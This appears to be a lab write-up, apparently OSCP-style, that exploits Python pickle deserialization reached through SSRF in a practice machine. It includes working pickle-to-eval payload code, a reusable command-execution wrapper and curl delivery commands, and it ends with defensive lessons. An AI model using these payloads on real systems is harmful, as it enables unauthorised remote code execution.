---
type: methodology
project: OSCP-Exam-PoC
status: drafted
updated: "2026-11-07"
tags:
  - methodology
  - deserialization
  - python
  - pickle
  - base64
  - remote-code-execution
  - oscp
---

# Insecure Deserialization — Python Pickle

## 1. Purpose

Deserialization is the process of reconstructing an object from serialized data.

Applications commonly serialize data for storage, transmission, caching, or inter-process communication.

The security risk arises when an application deserializes untrusted data using a mechanism capable of executing code during object reconstruction.

Python's `pickle` module is particularly dangerous in this context.

A malicious pickle can invoke Python functions during deserialization through its object reconstruction mechanisms, including the `__reduce__()` method.

If an application accepts attacker-controlled pickle data and processes it without appropriate trust restrictions, deserialization can become remote code execution (RCE).

The IN-01 challenge demonstrated this behavior through an internal administrative API reachable using SSRF.

## 2. IN-01 Attack Context

The public application exposed:

```
GET /fetch?url=https://example.com
```

Its SSRF vulnerability allowed access to an internal API:

```
http://127.1:9000/
```

The internal API returned:

```
IT GATE internal admin API (localhost only)
```

After discovering the administrative endpoint, the following route produced an interesting error:

```
/admin/exec
```

The investigation eventually identified the input parameter:

```
data
```

The resulting attack path was:

<figure class="method-atlas-figure">
  <picture>
    <source media="(max-width: 520px)" type="image/svg+xml" srcset="/diagrams/methodology-atlas-deserialization-context-mobile.svg" />
    <img src="/diagrams/methodology-atlas-deserialization-context.svg" alt="Deserialization / full trust-boundary path: External Attacker then Public Link Preview then SSRF Filter Bypass (127.1) then Internal Admin API (127.1:9000) then /admin/exec then data Parameter then Base64 Decoding then Python Pickle Deserialization then Remote Code Execution then Command Execution as web then user.txt." width="960" height="660" loading="lazy" decoding="async" />
  </picture>
  <figcaption>Cross-boundary context map. All original steps and labels are retained; refer to the surrounding methodology for evidence and limitations.</figcaption>
</figure>

The SSRF discovery process is documented separately in [[SSRF]].

## 3. Identify the Deserialization Handler

The most useful discovery was not the endpoint itself, but the difference in its error responses.

### 3.1 Establish the empty-input behavior

Request:

```
curl -sS --max-time 8 -i -G \
  --data-urlencode 'url=http://127.1:9000/admin/exec' \
  'http://TARGET_IP:WEB_PORT/fetch'
```

Observed response:

```
HTTP/1.1 400 BAD REQUEST
Content-Length: 23
```

Body:

```
error: Ran out of input
```

This suggested that the endpoint attempted to parse an empty or incomplete serialized input.

By itself, the error was not enough to identify the serialization mechanism.

### 3.2 Identify the expected parameter

A parameter-name wordlist was used against `/admin/exec`.

The relevant result was:

```
400    105    /admin/exec?data=x
```

The `data` parameter produced a different response from the empty-input baseline.

A request with an empty value:

```
/admin/exec?data=
```

returned:

```
error: Ran out of input
```

A request containing:

```
/admin/exec?data=x
```

returned:

```
error: Invalid base64-encoded string:
number of data characters (1) cannot be 1 more than a multiple of 4
```

### 3.3 Interpret the errors

The responses revealed a likely processing sequence:

1. The handler retrieves the `data` parameter.
    
2. The value is processed as Base64.
    
3. The decoded bytes are passed to a deserialization function.
    
4. Empty input causes the parser to report that it has run out of data.
    

The Base64 error was direct evidence of the first transformation.

The empty-input error was consistent with Python Pickle deserialization.

**Working conclusion:** The endpoint appeared to Base64-decode the supplied input and deserialize it as a Python pickle.

The subsequent successful execution payload confirmed that the handler could be abused for code execution.

## 4. Construct a Python Pickle Payload

### 4.1 Understand `__reduce__()`

Python Pickle supports object reconstruction through methods such as `__reduce__()`.

A class can define how an instance is reconstructed.

For example:

```
class Example:
    def __reduce__(self):
        return function, arguments
```

During unpickling, the supplied callable is invoked with the supplied arguments.

This behavior is useful for legitimate serialization but dangerous when untrusted data is deserialized.

In the IN-01 exploit, the reconstruction callable was `eval`.

The expression supplied to it invoked Python's `subprocess` module to execute an operating-system command.

### 4.2 The successful execution payload

The examination used the following construction:

```
import base64
import pickle

class Exploit:
    def __reduce__(self):
        return (
            eval,
            ("__import__('subprocess').check_output('id; whoami; pwd', shell=True, text=True)",)
        )

print(base64.b64encode(
    pickle.dumps(Exploit(), protocol=4)
).decode())
```

The payload performs several operations:

|Component|Purpose|
|---|---|
|`pickle.dumps()`|Serializes the malicious object|
|`protocol=4`|Selects Python Pickle protocol 4|
|`__reduce__()`|Defines the reconstruction behavior|
|`eval`|Evaluates the supplied Python expression|
|`subprocess`|Provides operating-system process execution|
|`check_output()`|Executes the command and captures its output|
|`shell=True`|Executes the supplied command through a shell|
|`text=True`|Returns captured output as text|
|`base64.b64encode()`|Encodes the serialized bytes for HTTP transport|

The command was intentionally selected to establish three things:

```
id
whoami
pwd
```

- `id`: identifies the numeric user and group context.
    
- `whoami`: identifies the account name.
    
- `pwd`: identifies the current working directory.
    

This provided execution evidence without depending on a reverse-shell callback.

## 5. Deliver the Payload Through the SSRF Endpoint

The serialized pickle was sent to the internal API through the public URL-fetching service.

The request structure was:

```
Public:
http://TARGET_IP:WEB_PORT/fetch

Internal:
http://127.1:9000/admin/exec?data=BASE64_PICKLE
```

The important detail is that the request contains nested URL parameters:

1. The public application receives a `url` parameter.
    
2. That parameter contains the internal API URL.
    
3. The internal API URL contains its own `data` parameter.
    
4. The `data` value contains Base64-encoded serialized content.
    

Each encoding layer must be handled correctly.

### 5.1 Generate and encode the payload

A reusable version of the payload construction is:

```
DATA=$(python3 - <<'PY'
import base64
import pickle

class Exploit:
    def __reduce__(self):
        expression = (
            "__import__('subprocess').check_output("
            "'id; whoami; pwd', "
            "shell=True, text=True)"
        )
        return eval, (expression,)

print(
    base64.b64encode(
        pickle.dumps(Exploit(), protocol=4)
    ).decode()
)
PY
)
```

### 5.2 Encode the nested parameter

Base64 output can contain:

```
+
/
=
```

These characters have special meanings in URL query strings.

In particular, an unescaped `+` may be interpreted as a space when the query parameter is parsed.

Therefore, the nested `data` value should be URL-encoded independently:

```
ENC_DATA=$(DATA="$DATA" python3 -c '
import os
from urllib.parse import quote

print(quote(os.environ["DATA"], safe=""))
')
```

### 5.3 Send the request

```
curl -sS --max-time 10 -G \
  --data-urlencode "url=http://127.1:9000/admin/exec?data=$ENC_DATA" \
  'http://TARGET_IP:WEB_PORT/fetch'
```

Replace the external target details with those provided by the current Academy instance.

The important distinction:

- `ENC_DATA` encodes the inner Base64 value.
    
- `--data-urlencode` encodes the outer `url` parameter.
    

Both layers matter.

## 6. Confirm Remote Code Execution

The successful exploit returned:

```
uid=1000(web) gid=1000(web) groups=1000(web)
web
/opt/app
```

<badge color="success">RCE confirmed</badge>

The result established:

|Property|Confirmed value|
|---|---|
|Username|`web`|
|UID|`1000`|
|GID|`1000`|
|Working directory|`/opt/app`|
|Hostname|`insane`|

This was successful remote command execution through the internal API.

It was not necessary to obtain an interactive shell to execute commands remotely.

### Important distinction

The following terms describe different things:

|Term|Meaning|
|---|---|
|SSRF|The public application makes an attacker-influenced server-side request|
|Insecure deserialization|Untrusted serialized data is reconstructed unsafely|
|RCE|Attacker-controlled input causes operating-system command execution|
|Reverse shell|The target initiates an outbound connection to an attacker-controlled listener|
|In-band execution|The attacker submits a command and receives its output through the original request/response channel|

IN-01 successfully achieved RCE and in-band command execution.

The reverse-shell connection attempts were unsuccessful.

## 7. Establish a Reusable In-Band Execution Function

Because the reverse-shell callbacks were unreliable, the investigation continued using the confirmed in-band execution primitive.

The following Zsh-compatible function generalizes the successful request construction.

Set the external endpoint and internal endpoint for the current instance:

```
FETCH_ENDPOINT='http://TARGET_IP:WEB_PORT/fetch'
INTERNAL_ENDPOINT='http://127.1:9000/admin/exec'
```

Define:

```
ssrf_exec() {
    local remote_cmd="${1:?Usage: ssrf_exec '<remote command>'}"
    local data
    local enc_data
    local internal_url

    data=$(
        REMOTE_CMD="$remote_cmd" python3 - <<'PY'
import os
import base64
import pickle

class Exploit:
    def __reduce__(self):
        command = os.environ["REMOTE_CMD"]

        expression = (
            "__import__('subprocess').run("
            + repr(command)
            + ", shell=True, stdout=-1, stderr=-2, "
              "text=True, errors='replace').stdout"
        )

        return eval, (expression,)

print(
    base64.b64encode(
        pickle.dumps(Exploit(), protocol=4)
    ).decode()
)
PY
    ) || return 1

    enc_data=$(
        DATA="$data" python3 - <<'PY'
import os
from urllib.parse import quote

print(quote(os.environ["DATA"], safe=""))
PY
    ) || return 1

    internal_url="${INTERNAL_ENDPOINT}?data=${enc_data}"

    curl -sS --max-time 12 -G \
        --data-urlencode "url=${internal_url}" \
        "$FETCH_ENDPOINT"

    printf '\n'
}
```

Example invocation:

```
ssrf_exec 'id; whoami; hostname; pwd'
```

The function:

1. Accepts a remote command.
    
2. Constructs the Python Pickle object.
    
3. Serializes it using protocol 4.
    
4. Base64-encodes the serialized data.
    
5. URL-encodes the nested parameter.
    
6. Constructs the internal API URL.
    
7. URL-encodes the outer request parameter.
    
8. Submits the request and displays the returned output.
    

This avoids reconstructing the payload manually for each command.

The endpoint values are instance-specific. Update them after a lab reset.

## 8. Reverse-Shell Attempts and VPN Difficulties

After confirming in-band RCE, an interactive reverse shell was attempted.

The local VPN interfaces at the time were:

```
tun0: 10.10.17.123
tun1: 10.144.220.24
```

The initial callback used:

```
10.144.220.24:4444
```

No connection arrived.

The callback was subsequently changed to:

```
10.10.17.123:4444
```

The second attempt also failed.

### What is confirmed?

- The remote command-execution primitive worked.
    
- The reverse-shell trigger was accepted by the application.
    
- The HTTP response returned 200 with an empty body.
    
- The listener received no reverse-shell connection.
    

### What is not confirmed?

The exact reason the callbacks failed was not established.

VPN routing was suspected, but the available evidence does not prove that it was the only cause.

### Operational conclusion

Do not confuse failed reverse-shell callbacks with failed RCE.

The correct fallback was to retain in-band command execution through the HTTP response.

This remained sufficient to:

- Identify the execution account.
    
- Enumerate the filesystem.
    
- Retrieve the user flag.
    
- Perform privilege-escalation enumeration.
    
- Retrieve the root flag after the privilege escalation.
    

See [[VPN Routing and Reverse Shells]].

## 9. Initial Access and User Flag

Once command execution was confirmed as `web`, the next task was to identify the user's home directory and retrieve the user flag.

The command used was:

```
cat /home/$(whoami)/user.txt
```

It was executed remotely through the same in-band Pickle execution mechanism.

The use of `$(whoami)` allowed the shell to substitute the current execution account into the path.

This avoided assuming a username before verifying it.

The initial-access process was therefore:

<figure class="method-atlas-figure">
  <picture>
    <source media="(max-width: 520px)" type="image/svg+xml" srcset="/diagrams/methodology-atlas-deserialization-user-flow-mobile.svg" />
    <img src="/diagrams/methodology-atlas-deserialization-user-flow.svg" alt="Deserialization / user-access sequence: SSRF then Internal API then Pickle Deserialization then RCE as web then Retrieve /home/web/user.txt then Privilege-Escalation Enumeration." width="960" height="490" loading="lazy" decoding="async" />
  </picture>
  <figcaption>Six-stage objective summary. All original steps and labels are retained; refer to the surrounding methodology for evidence and limitations.</figcaption>
</figure>

The subsequent privilege-escalation path is documented in [[Linux Privilege Escalation]] and the machine-specific files:

- [[IN-01 Overview]]
    
- [[Difficulty Levels/Insane/IN-01/user]]
    
- [[Difficulty Levels/Insane/IN-01/root]]
    

## 10. Common Mistakes and Lessons

### 10.1 Confusing a parser error with a confirmed vulnerability

The initial `Ran out of input` response suggested deserialization, but it did not independently prove arbitrary code execution.

The successful command output provided the definitive evidence.

### 10.2 Fuzzing routes after finding a meaningful handler

The investigation spent time testing generic API route names and parameter names.

Once `/admin/exec` and `data` were identified, the correct move was to investigate the input format and use the resulting evidence.

Do not continue broad endpoint fuzzing when a specific handler has already exposed a deserialization error.

### 10.3 Failing to encode nested parameters

The reverse-shell payload initially produced:

```
error: Invalid base64-encoded string:
number of data characters (281) cannot be 1 more than a multiple of 4
```

The cause was incorrect handling of the nested Base64 value.

The `+` character was interpreted as a space during query parsing.

The correction was to URL-encode the nested `data` value separately before encoding the outer `url` parameter.

### 10.4 Assuming HTTP 200 proves a reverse shell connected

The reverse-shell trigger returned:

```
[HTTP 200 | TIME 0.674576s]
```

But the listener received no connection.

HTTP 200 confirmed that the public request was processed successfully. It did not prove that the background callback succeeded.

### 10.5 Using binary output with a text decoder

An inspection command later produced:

```
'utf-8' codec can't decode byte 0x98
```

The execution wrapper attempted to handle output that was not valid UTF-8 text.

The later approach used text output with replacement handling:

```
text=True, errors='replace'
```

For binary data, use an explicit binary-safe transport rather than assuming all remote command output is UTF-8.

### 10.6 Abandoning a working primitive unnecessarily

The reverse-shell attempts were not required to complete the challenge.

Once in-band RCE was confirmed, continuing with it was the more reliable approach under the existing network constraints.

**The lesson:** preserve a working execution primitive. Do not replace it merely because an interactive shell would be more convenient.

## 11. Deserialization Investigation Checklist

### Input discovery

- Identify the endpoint accepting serialized input.
    
- Determine the input parameter name.
    
- Capture empty-input behavior.
    
- Compare malformed and validly structured input.
    
- Identify any Base64 or other transport encoding.
    
- Identify the likely serialization mechanism.
    

### Payload construction

- Identify the serialization protocol.
    
- Understand the object reconstruction mechanism.
    
- Construct a controlled execution test.
    
- Serialize the object.
    
- Encode it for transport.
    
- Correctly handle nested URL parameters.
    

### Execution validation

- Verify the remote UID and GID.
    
- Verify the execution username.
    
- Verify the hostname and working directory.
    
- Confirm that output is returned through the HTTP response.
    
- Distinguish confirmed RCE from reverse-shell connectivity.
    

### Post-exploitation

- Preserve the confirmed execution primitive.
    
- Retrieve the user flag.
    
- Begin privilege-escalation enumeration.
    
- Record the actual execution context.
    
- Preserve requests, payloads, errors, and output.
    

## 12. Defensive Lessons

The vulnerability could have been prevented by avoiding unsafe deserialization of attacker-controlled data.

Recommended controls:

- Never unpickle untrusted data.
    
- Use data-only serialization formats when object reconstruction is unnecessary.
    
- Validate and authenticate input before processing it.
    
- Avoid exposing internal administrative services through public application functionality.
    
- Enforce network-level restrictions in addition to URL validation.
    
- Avoid returning detailed internal parser and execution errors to clients.
    
- Restrict the privileges of application processes.
    
- Apply appropriate process isolation and security controls.
    

Base64 encoding does not provide authenticity, integrity, or protection against malicious serialized objects. It is only an encoding mechanism.

## 13. Related Notes

### Machine Documentation

- [[IN-01 Overview]]
    
- [[Difficulty Levels/Insane/IN-01/user]]
    
- [[Difficulty Levels/Insane/IN-01/root]]
    

### Methodology

- [[SSRF]]
    
- [[Initial Access]]
    
- [[Linux Privilege Escalation]]
    
- [[Evidence Collection]]
    

### Difficulties and Lessons

- [[VPN Routing and Reverse Shells]]
    
- [[HTTP Client and Connectivity Failures]]
    
- [[Tooling and Workflow Mistakes]]
    

